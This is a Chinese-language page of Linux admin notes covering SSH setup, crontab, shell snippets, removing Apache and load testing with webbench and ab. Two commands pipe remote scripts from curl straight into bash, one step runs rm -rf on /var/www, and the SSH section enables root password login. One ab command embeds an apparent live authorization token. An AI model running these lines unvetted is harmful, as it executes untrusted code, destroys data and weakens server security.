+</code></pre></div><p>上传文件</p> <div class="language-bash extra-class"><pre class="language-bash"><code>rz <span class="token punctuation">[</span>回车<span class="token punctuation">]</span>
+</code></pre></div><p>下载文件</p> <div class="language-bash extra-class"><pre class="language-bash"><code>sz fileName.txt
+</code></pre></div><p>详细：<a href="https://birdteam.net/4479" target="_blank" rel="noopener noreferrer">https://birdteam.net/4479<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <h1 id="ssh远程链接工具"><a href="#ssh远程链接工具" class="header-anchor">#</a> SSh远程链接工具</h1> <p>FinalShell（推荐）：<a href="http://www.hostbuf.com/" target="_blank" rel="noopener noreferrer">http://www.hostbuf.com/<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>Terminus（推荐）：<a href="https://github.com/Eugeny/terminus" target="_blank" rel="noopener noreferrer">https://github.com/Eugeny/terminus<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>Git (必备)：<a href="https://git-scm.com/" target="_blank" rel="noopener noreferrer">https://git-scm.com/<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>babun：<a href="http://babun.github.io/" target="_blank" rel="noopener noreferrer">http://babun.github.io/<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <h1 id="linux开启ssh连接"><a href="#linux开启ssh连接" class="header-anchor">#</a> linux开启ssh连接</h1> <ul><li><p>debian</p> <div class="language- extra-class"><pre class="language-text"><code>sudo vim /etc/ssh/sshd_config
+
+# debian9:修改一下文件
+将#PasswordAuthentication no的注释去掉，并且将no修改为yes
+将#PermitRootLogin prohibit-password的注释去掉，将prohibit-password改为yes
+重启ssh： sudo systemctl restartt sshd
+#================================================
+#debain10
+PermitRootLogin yes
+PasswordAuthention yes
+重启ssh： sudo systemctl restartt sshd
+</code></pre></div></li></ul> <h1 id="压力测试"><a href="#压力测试" class="header-anchor">#</a> 压力测试</h1> <blockquote><p>webbench -c 并发数 -t 运行测试时间 URL 【http://www.baidu.com/】</p></blockquote> <div class="language-bash extra-class"><pre class="language-bash"><code>webbench -c <span class="token number">100</span> -t <span class="token number">10</span> http://www.baidu.com/
+</code></pre></div><h1 id="测速脚本"><a href="#测速脚本" class="header-anchor">#</a> 测速脚本</h1> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">bash</span> <span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token function">curl</span> -Lso- https://git.io/superspeed<span class="token punctuation">)</span>
+</code></pre></div><h1 id="如何快速访问github"><a href="#如何快速访问github" class="header-anchor">#</a> 如何快速访问Github</h1> <h2 id="ip解析"><a href="#ip解析" class="header-anchor">#</a> IP解析</h2> <p>作为一个小白，经常需要访问 <code>github</code> 来学习，但是呢经常打不开这个网站，或者clone的时候网速很慢，这个时候==怎么解决呢？==</p> <p>1、打开这个网站：https://www.ipaddress.com ，输入我们<strong>需要访问</strong>的域名，进行搜索，你会得到一个<strong>ip地址</strong>。</p> <p>2、修改本地<code>hosts</code> 文件直接访问，这样就可以了，</p> <p><strong>案例：</strong> 访问 <code>github.com</code> 和<code>raw.githubusercontent.com</code></p> <p>打开 <code>https://www.ipaddress.com</code> 搜索 <code>github.com</code> 和<code>raw.githubusercontent.com</code>  你会看到一个如下IP地址</p> <p><img src="/images/image-20201215110741455.png" alt="image-20201215110741455"></p> <p>打开本机电脑的 <code>hosts</code> 文件，我的电脑是linux，所以我的 <code>hosts</code>文件在 (window用户自行百度)</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">sudo</span> <span class="token function">vim</span> /etc/hosts
+</code></pre></div><p>添加如下配置</p> <div class="language-host extra-class"><pre class="language-text"><code>140.82.114.4 github.com
+199.232.96.133 raw.githubusercontent.com
+</code></pre></div><p>现在打开 <code>https://github.com</code> 就可以访问了。</p> <p>如何还是无法访问，cmd中输入<code>ipconfig/flushdns</code>刷新dns</p> <p>其它国外的网站是不是也可以类似的操作？比如 google? youtube? .........</p> <h2 id="github镜像站"><a href="#github镜像站" class="header-anchor">#</a> Github镜像站</h2> <p>假如以上方法还是很慢，或者不可行，你可以尝试采用下面的方法</p> <blockquote><p>Github: https://github.com/fhefh2015/Fast-GitHub</p> <p>Google App: https://chrome.google.com/webstore/detail/github%E5%8A%A0%E9%80%9F/mfnkflidjnladnkldfonnaicljppahpg （需要体力爬梯子）</p></blockquote> <p>安装完之后你的界面是这样的</p> <p><img src="/images/image-20201215111505365.png" alt="image-20201215111505365"></p> <p>先睹为快：https://github.com.cnpmjs.org/orangbus/tool</p> <h2 id="switchhosts"><a href="#switchhosts" class="header-anchor">#</a> SwitchHosts</h2> <blockquote><p>https://github.com/oldj/SwitchHosts/releases</p></blockquote> <p>具体怎么使用就查看官网文档吧。</p> <h1 id="ubuntu-install-brew"><a href="#ubuntu-install-brew" class="header-anchor">#</a> ubuntu install brew</h1> <blockquote><p>https://docs.brew.sh/Homebrew-on-Linux</p></blockquote> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">git</span> clone https://github.com/Homebrew/linuxbrew.git ~/.linuxbrew
+
+<span class="token function">vim</span> .bash_profile
+<span class="token comment"># ====================</span>
+<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token string">&quot;<span class="token environment constant">$HOME</span>/.linuxbrew/bin:<span class="token environment constant">$PATH</span>&quot;</span>
+<span class="token builtin class-name">export</span> <span class="token assign-left variable">MANPATH</span><span class="token operator">=</span><span class="token string">&quot;<span class="token environment constant">$HOME</span>/.linuxbrew/share/man:<span class="token variable">$MANPATH</span>&quot;</span>
+<span class="token builtin class-name">export</span> <span class="token assign-left variable">INFOPATH</span><span class="token operator">=</span><span class="token string">&quot;<span class="token environment constant">$HOME</span>/.linuxbrew/share/info:<span class="token variable">$INFOPATH</span>&quot;</span>
+<span class="token comment"># ====================</span>
+
+brew update <span class="token comment">## run twice </span>
+brew doctor
+
+<span class="token comment"># test</span>
+brew <span class="token function">install</span> hello
+</code></pre></div><h1 id="删除站点的-user-ini-文件"><a href="#删除站点的-user-ini-文件" class="header-anchor">#</a> 删除站点的 .user.ini 文件</h1> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">sudo</span> chattr -i .user.ini
+</code></pre></div><h1 id="推荐uinux发行版-常用debian"><a href="#推荐uinux发行版-常用debian" class="header-anchor">#</a> 推荐Uinux发行版-常用Debian</h1> <p>Manjaro：<a href="https://manjaro.org/" target="_blank" rel="noopener noreferrer">https://manjaro.org/<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>Deepin：<a href="https://www.deepin.org/" target="_blank" rel="noopener noreferrer">https://www.deepin.org/<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>Ubuntu：<a href="https://www.ubuntu.com/index_kylin" target="_blank" rel="noopener noreferrer">https://www.ubuntu.com/index_kylin<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>Centos：<a href="https://www.centos.org/" target="_blank" rel="noopener noreferrer">https://www.centos.org/<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <h1 id="扶墙脚本"><a href="#扶墙脚本" class="header-anchor">#</a> 扶墙脚本</h1> <p>233Blog:https://233blog.com</p> <p>要求：Ubuntu 16+ / Debian 8+ / CentOS 7+ 系统</p> <p>推荐使用 Debian 9 系统，脚本会自动启用 BBR 优化。</p> <p>备注：不推荐使用 Debian 8 系统，因为 Caddy 申请证书可能会出现一些莫名其妙的问题</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">bash</span> <span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token function">curl</span> -s -L https://git.io/v2ray.sh<span class="token punctuation">)</span>
+</code></pre></div><h1 id="crontab使用"><a href="#crontab使用" class="header-anchor">#</a> crontab使用</h1> <blockquote><p>语法检查网站：https://crontab.guru/</p></blockquote> <p>安装：</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> contab
+</code></pre></div><p>基本命令</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">sudo</span> <span class="token function">service</span> <span class="token function">cron</span> restart/status/start
+</code></pre></div><p>基本语法</p> <div class="language- extra-class"><pre class="language-text"><code>语法： 分钟 小时 每月中的某一天 月份 每周中的某一天 需要执行的命令
+
+// 每分钟输出 orangbus.cn 字符串到 /home/orangbus/data/demo.txt 文件中
+* * * * * echo &quot;orangbus.cn&quot; &gt;&gt; /home/orangbus/data/demo.txt
+</code></pre></div><p>设置一个定时任务: 在打开的文件中加入你需要执行的命令即可，然后保存</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">crontab</span> -e
+</code></pre></div><p>列出现在运行的任务</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">crontab</span> -l
+</code></pre></div><p>案例： 每个小时以交互式备份 laradock 中数据库数据</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">crontab</span> -e 
+
+* <span class="token number">1</span> * * * docker <span class="token builtin class-name">exec</span> -it 7c02a70f345c mysqldump -uroot -proot xiehui <span class="token operator">&gt;</span> /home/<span class="token environment constant">$USER</span>/Code/Data
+/<span class="token variable"><span class="token variable">`</span><span class="token function">date</span> +%Y-%m-%d<span class="token variable">`</span></span>.sql
+</code></pre></div><h1 id="shell笔记"><a href="#shell笔记" class="header-anchor">#</a> Shell笔记</h1> <h2 id="颜色"><a href="#颜色" class="header-anchor">#</a> 颜色</h2> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token shebang important">#!/usr/bin/env bash</span>
+<span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
+<span class="token builtin class-name">export</span> <span class="token environment constant">PATH</span>
+
+<span class="token comment"># 设置字体颜色函数</span>
+<span class="token keyword">function</span> <span class="token function-name function">blue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token builtin class-name">echo</span> -e <span class="token string">&quot;<span class="token entity" title="\033">\033</span>[34m<span class="token entity" title="\033">\033</span>[01m <span class="token variable">$1</span> <span class="token entity" title="\033">\033</span>[0m&quot;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">function</span> <span class="token function-name function">green</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token builtin class-name">echo</span> -e <span class="token string">&quot;<span class="token entity" title="\033">\033</span>[32m<span class="token entity" title="\033">\033</span>[01m <span class="token variable">$1</span> <span class="token entity" title="\033">\033</span>[0m&quot;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">function</span> <span class="token function-name function">greenbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token builtin class-name">echo</span> -e <span class="token string">&quot;<span class="token entity" title="\033">\033</span>[43;42m<span class="token entity" title="\033">\033</span>[01m <span class="token variable">$1</span> <span class="token entity" title="\033">\033</span>[0m&quot;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">function</span> <span class="token function-name function">red</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token builtin class-name">echo</span> -e <span class="token string">&quot;<span class="token entity" title="\033">\033</span>[31m<span class="token entity" title="\033">\033</span>[01m <span class="token variable">$1</span> <span class="token entity" title="\033">\033</span>[0m&quot;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">function</span> <span class="token function-name function">redbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token builtin class-name">echo</span> -e <span class="token string">&quot;<span class="token entity" title="\033">\033</span>[37;41m<span class="token entity" title="\033">\033</span>[01m <span class="token variable">$1</span> <span class="token entity" title="\033">\033</span>[0m&quot;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">function</span> <span class="token function-name function">yellow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token builtin class-name">echo</span> -e <span class="token string">&quot;<span class="token entity" title="\033">\033</span>[33m<span class="token entity" title="\033">\033</span>[01m <span class="token variable">$1</span> <span class="token entity" title="\033">\033</span>[0m&quot;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">function</span> <span class="token function-name function">white</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token builtin class-name">echo</span> -e <span class="token string">&quot;<span class="token entity" title="\033">\033</span>[37m<span class="token entity" title="\033">\033</span>[01m <span class="token variable">$1</span> <span class="token entity" title="\033">\033</span>[0m&quot;</span>
+<span class="token punctuation">}</span>
+</code></pre></div><h2 id="初始化工具安装"><a href="#初始化工具安装" class="header-anchor">#</a> 初始化工具安装</h2> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token comment">#工具安装</span>
+<span class="token function-name function">install_pack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token assign-left variable">pack_name</span><span class="token operator">=</span><span class="token string">&quot;基础工具&quot;</span>
+    <span class="token builtin class-name">echo</span> <span class="token string">&quot;===&gt; Start to install curl&quot;</span>    
+    <span class="token keyword">if</span> <span class="token punctuation">[</span> -x <span class="token string">&quot;<span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">command</span> -v yum<span class="token variable">)</span></span>&quot;</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
+        <span class="token builtin class-name">command</span> -v <span class="token function">curl</span> <span class="token operator">&gt;</span> /dev/null <span class="token operator">||</span> yum <span class="token function">install</span> -y <span class="token function">curl</span>
+    <span class="token keyword">elif</span> <span class="token punctuation">[</span> -x <span class="token string">&quot;<span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">command</span> -v <span class="token function">apt</span><span class="token variable">)</span></span>&quot;</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
+        <span class="token builtin class-name">command</span> -v <span class="token function">curl</span> <span class="token operator">&gt;</span> /dev/null <span class="token operator">||</span> <span class="token function">apt</span> <span class="token function">install</span> -y <span class="token function">curl</span>
+    <span class="token keyword">else</span>
+        <span class="token builtin class-name">echo</span> <span class="token string">&quot;Package manager is not support this OS. Only support to use yum/apt.&quot;</span>
+        <span class="token builtin class-name">exit</span> -1
+    <span class="token keyword">fi</span>    
+<span class="token punctuation">}</span>
+</code></pre></div><h2 id="root权限检测"><a href="#root权限检测" class="header-anchor">#</a> root权限检测</h2> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token punctuation">[</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">id</span> -u<span class="token variable">)</span></span> <span class="token operator">!=</span> <span class="token string">&quot;0&quot;</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">{</span> <span class="token builtin class-name">echo</span> <span class="token string">&quot;<span class="token variable">${CFAILURE}</span>Error: You must be root to run this script<span class="token variable">${CEND}</span>&quot;</span><span class="token punctuation">;</span> <span class="token builtin class-name">exit</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
+</code></pre></div><h2 id="sed-命令配合-for-循环方式"><a href="#sed-命令配合-for-循环方式" class="header-anchor">#</a> sed 命令配合 for 循环方式</h2> <p>假如我们现在有一堆文件，文件名格式是 test01.txt、test02.txt、test03.txt、test04.txt 也就是前半部分是英文，后半部分是数字。我们现在想将文件名改成 test-01.txt 这种形式。这次，我们用 sed 命令来完成这个需求。</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token shebang important">#!/bin/bash</span>
+
+<span class="token keyword">for</span> <span class="token for-or-select variable">file</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> *.txt<span class="token variable">`</span></span>
+<span class="token keyword">do</span>
+     <span class="token assign-left variable">newFile</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">echo</span> $file <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s/[a−z]\+[0−9]\+/<span class="token entity" title="\1">\1</span>-<span class="token entity" title="\2">\2</span>/'</span><span class="token variable">`</span></span>
+     <span class="token function">mv</span> <span class="token variable">$file</span> <span class="token variable">$newFile</span>
+<span class="token keyword">done</span>
+</code></pre></div><p>批量修改文件名:  ==斗pc穹.mp4  =&gt; 斗破苍穹.mp4==</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token shebang important">#!/bin/bash</span>
+<span class="token keyword">for</span> <span class="token for-or-select variable">file</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> *.mp4<span class="token variable">`</span></span>
+<span class="token keyword">do</span>
+     <span class="token assign-left variable">newFile</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">echo</span> $file <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s/pc/破苍/'</span><span class="token variable">`</span></span>
+
+     <span class="token function">mv</span> <span class="token variable">$file</span> <span class="token variable">$newFile</span>
+<span class="token keyword">done</span>
+</code></pre></div><h1 id="debian卸载apache"><a href="#debian卸载apache" class="header-anchor">#</a> Debian卸载apache</h1> <p>一般80端口被占用会和我们正在安装的程序产生冲突。这时候我们可以使用。</p> <div class="language- extra-class"><pre class="language-text"><code>lsof -i
+
+lsof -i:80
+</code></pre></div><p>来查看端口占用情况。如果是apache2占用了，我们就先安全卸载它。Debian 下删除apache 2 的代码</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">sudo</span> <span class="token function">apt-get</span> --purge remove apache2 <span class="token operator">&amp;&amp;</span>
+<span class="token function">sudo</span> <span class="token function">apt-get</span> --purge remove apache2.2-common <span class="token operator">&amp;&amp;</span>
+<span class="token function">sudo</span> <span class="token function">apt-get</span> autoremove
+</code></pre></div><p>最后还需要找到没有删除掉的配置文件进行删除</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">sudo</span> <span class="token function">find</span> /etc -name <span class="token string">&quot;apache&quot;</span> -exec <span class="token function">rm</span> -rf <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token punctuation">\</span><span class="token punctuation">;</span>
+<span class="token function">sudo</span> <span class="token function">rm</span> -rf /var/www
+</code></pre></div><p>Linux debian 下重装apache 2</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> apache2
+<span class="token function">sudo</span> /etc/init.d/apache2 restart
+</code></pre></div><h1 id="服务器压力测试"><a href="#服务器压力测试" class="header-anchor">#</a> 服务器压力测试</h1> <p>-c : 并发数</p> <p>-n:请求次数</p> <div class="language-bash extra-class"><pre class="language-bash"><code>ab -c <span class="token number">100</span> -n <span class="token number">10000</span> demo.com/ <span class="token comment"># 模拟 100 个用户发起 10000 次请求</span>
+ab -c <span class="token number">127</span> -n <span class="token number">1000</span> -H <span class="token string">&quot;Authorization: 4d43fe0c86c9d21019389678def79da2&amp;6&amp;1621665729&quot;</span> http://wanyin.heimeiai.com/api/exam/cate/list?cid<span class="token operator">=</span><span class="token number">11</span>
+</code></pre></div><p>其它参数：</p> <div class="language- extra-class"><pre class="language-text"><code>-n: 测试会话中所执行的请求个数,默认仅执行一个请求 
+-c: 一次产生的请求个数,即同一时间发出多少个请求,默认为一次一个 
+-t: 测试所进行的最大秒数,默认为无时间限制....其内部隐含值是[-n 50000],它可以使对服务器的测试限制在一个固定的总时间以内 
+-p: 包含了需要POST的数据的文件 
+-T: POST数据所使用的Content-type头信息 
+-v: 设置显示信息的详细程度 
+-w: 以HTML表格的形式输出结果,默认是白色背景的两列宽度的一张表
+-i: 以HTML表格的形式输出结果,默认是白色背景的两列宽度的一张表 
+-x: 设置&lt;table&gt;属性的字符串,此属性被填入&lt;table 这里&gt; 
+-y: 设置&lt;tr&gt;属性的字符串 
+-z: 设置&lt;td&gt;属性的字符串 
+-C: 对请求附加一个Cookie行，其典型形式是name=value的参数对,此参数可以重复 
+-H: 对请求附加额外的头信息,此参数的典型形式是一个有效的头信息行,其中包含了以冒号分隔的字段和值的对(如&quot;Accept-Encoding: zip/zop;8bit&quot;) 
+-A: HTTP验证,用冒号:分隔传递用户名及密码 
+-P: 无论服务器是否需要(即是否发送了401认证需求代码),此字符串都会被发送 
+-X: 对请求使用代理服务器 
+-V: 显示版本号并退出 
+-k: 启用HTTP KeepAlive功能,即在一个HTTP会话中执行多个请求,默认为不启用KeepAlive功能 
+-d: 不显示&quot;percentage served within XX [ms] table&quot;的消息(为以前的版本提供支持) 
+-S: 不显示中值和标准背离值,且均值和中值为标准背离值的1到2倍时,也不显示警告或出错信息,默认会显示最小值/均值/最大值等(为以前的版本提供支持) 
+-g: 把所有测试结果写入一个'gnuplot'或者TSV(以Tab分隔的)文件 
+-e: 产生一个以逗号分隔的(CSV)文件,其中包含了处理每个相应百分比的请求所需要(从1%到100%)的相应百分比的(以微妙为单位)时间 
+-h: 显示使用方法 
+-k: 发送keep-alive指令到服务器端
+</code></pre></div><p><strong>返回信息详解</strong></p> <div class="language-tex extra-class"><pre class="language-tex"><code>This is ApacheBench, Version 2.3 &lt;<span class="token equation string">$Revision: 1879490 $</span>&gt;
+Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/
+Licensed to The Apache Software Foundation, http://www.apache.org/
+
+Benchmarking www.xxx.cn (be patient)
+
+
+Server Software:        nginx (服务器软件的版本信息)
+Server Hostname:        www.xxx.cn （请求的url）
+Server Port:            80 (请求端口)
+
+Document Path:          / (请求路劲)
+Document Length:        256738 bytes (页面长度 单位是字节)
+
+Concurrency Level:      127 (并发数)
+Time taken for tests:   202.470 seconds (一共使用了 124s)
+Complete requests:      1000 (请求的次数)
+Failed requests:        0 (失败的请求)
+Total transferred:      257836000 bytes (总共传输的字节数 http 头信息)
+HTML transferred:       256738000 bytes (实际页面传递的字节数)
+Requests per second:    4.94 <span class="token punctuation">[</span>#/sec<span class="token punctuation">]</span> (mean) (每秒多少个请求)
+Time per request:       25713.630 <span class="token punctuation">[</span>ms<span class="token punctuation">]</span> (mean) (平均每个用户等待多长时间)
+Time per request:       202.470 <span class="token punctuation">[</span>ms<span class="token punctuation">]</span> (mean, across all concurrent requests) (服务器平均用多长时间处理)
+Transfer rate:          1243.61 <span class="token punctuation">[</span>Kbytes/sec<span class="token punctuation">]</span> received (每秒获取多少数据)
+
+Connection Times (ms)
+              min  mean<span class="token punctuation">[</span>+/-sd<span class="token punctuation">]</span> median   max
+Connect:        4 2624 1919.7   2360    6329 ()
+Processing:   362 22309 3988.6  22767   49337
+Waiting:      133 2656 1769.9   2092   23343
+Total:        366 24933 4790.0  26094   55634
+
+Percentage of the requests served within a certain time (ms)
+  50<span class="token comment">%  26094 (50% 的用户的请求 15.588ms 内返回)</span>
+  66<span class="token comment">%  27477</span>
+  75<span class="token comment">%  27765</span>
+  80<span class="token comment">%  28206</span>
+  90<span class="token comment">%  29575</span>
+  95<span class="token comment">%  30081</span>
+  98<span class="token comment">%  30610</span>
+  99<span class="token comment">%  31703</span>
+ 100<span class="token comment">%  55634 (longest request) 最长请求时间</span>
+
+</code></pre></div><h1 id="linux查看文件"><a href="#linux查看文件" class="header-anchor">#</a> linux查看文件</h1> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">tail</span> -f path/filename.txt
+</code></pre></div><h1 id="linux文件清理"><a href="#linux文件清理" class="header-anchor">#</a> linux文件清理</h1> <h1 id="查看当前目录下的文件磁盘占用"><a href="#查看当前目录下的文件磁盘占用" class="header-anchor">#</a> 查看当前目录下的文件磁盘占用</h1> <div class="language-bash extra-class"><pre class="language-bash"><code> <span class="token function">du</span> -lh --max-depth<span class="token operator">=</span><span class="token number">1</span>
+ ---------------------------
+<span class="token number">8</span>.0K    ./mailhog
+12K     ./frp
+260K    ./.git
+<span class="token number">8</span>.0K    ./aria2
+<span class="token number">8</span>.0K    ./panindex
+<span class="token number">8</span>.0K    ./elasticsearch
+<span class="token number">8</span>.0K    ./alist
+<span class="token number">8</span>.0K    ./redis
+28K     ./minioCluster
+<span class="token number">8</span>.0K    ./cloudreve
+<span class="token number">8</span>.0K    ./nextcloud
+<span class="token number">2</span>.3G    ./meilisearch
+</code></pre></div><h1 id="linux查看文件或文件夹大小-du命令"><a href="#linux查看文件或文件夹大小-du命令" class="header-anchor">#</a> Linux查看文件或文件夹大小: du命令</h1> <p>du命令用于显示目录或文件的大小。
+du会显示指定的目录或文件所占用的磁盘空间。</p> <p>语法：</p> <div class="language-python extra-class"><pre class="language-python"><code>du <span class="token punctuation">[</span><span class="token operator">-</span>abcDhHklmsSx<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span>L <span class="token operator">&lt;</span>符号连接<span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span>X <span class="token operator">&lt;</span>文件<span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">-</span>block<span class="token operator">-</span>size<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">-</span>exclude<span class="token operator">=</span><span class="token 